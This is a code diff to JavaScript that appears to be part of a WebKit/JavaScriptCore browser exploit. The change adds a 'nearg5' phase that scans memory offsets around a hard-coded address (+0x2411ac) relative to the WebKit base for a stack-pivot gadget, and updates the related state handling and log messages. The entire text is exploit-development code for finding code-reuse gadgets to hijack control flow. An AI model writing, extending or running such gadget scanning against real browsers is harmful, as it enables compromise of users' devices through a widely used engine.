@@ -18,7 +18,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828l";
+const BUILD_ID = "rw-20250828m";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -669,6 +669,14 @@ function pivotClusterRange(found) {
 }
 
 function pivotScanRange(key, phase, found) {
+    if (phase === "nearg5") {
+        const hint = pivotScanHint(key, found, SCAN_LOW_MAX);
+        if (hint <= 0 || hint >= SCAN_LOW_MAX) return null;
+        return {
+            minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(SCAN_LOW_MAX, hint + SCAN_NEAR_RADIUS),
+        };
+    }
     if (phase === "cluster") {
         return pivotClusterRange(found);
     }
@@ -689,7 +697,7 @@ function pivotScanPatterns(label, pat) {
 }
 
 function pivotStartPhase(label) {
-    return label === "G5" ? "cluster" : "low";
+    return label === "G5" ? "nearg5" : "low";
 }
 
 function pivotScanFoundInit() {
@@ -970,6 +978,15 @@ async function scanPivotRowPhase(p, webkitBase, off) {
         return "continue";
     }
 
+    if (label === "G5" && pivotScan.phase === "nearg5") {
+        pivotScan.phase = "cluster";
+        pivotScan.cursor = null;
+        pivotScan.bestHit = null;
+        savePivotScanState(pivotScan);
+        mark("G5-PHASE", "near-G0 (+0x2411ac) miss — trying G0-G4 cluster");
+        return "continue";
+    }
+
     if (label === "G5" && pivotScan.phase === "cluster") {
         if (SCAN_G5_FULL) {
             pivotScan.phase = "low";
@@ -980,9 +997,9 @@ async function scanPivotRowPhase(p, webkitBase, off) {
             return "continue";
         }
         logG5Cands(pivotScan.g5Cands);
-        mark("SCAN-MISS", "G5 — cluster miss — tap G5 probe or ?g5=hex (add ?g5full=1 for full low)");
+        mark("SCAN-MISS", "G5 — try ?g5=2411ac or ?g5full=1");
         pivotScan.rowIdx++;
-        pivotScan.phase = "cluster";
+        pivotScan.phase = "nearg5";
         pivotScan.bestHit = null;
         pivotScan.g5Cands = [];
         savePivotScanState(pivotScan);
@@ -1034,12 +1051,12 @@ function runG5ClusterProbe() {
             break;
         }
     }
-    pivotScan.phase = "cluster";
+    pivotScan.phase = "nearg5";
     pivotScan.cursor = null;
     pivotScan.bestHit = null;
     pivotScan.g5Cands = [];
     savePivotScanState(pivotScan);
-    mark("G5-PROBE", "cluster scan (chunked, OOM-safe)");
+    mark("G5-PROBE", "near-G0 @+0x2411ac (G0+0x15d362, chunked)");
     runPivotScanLoop(true);
 }
 
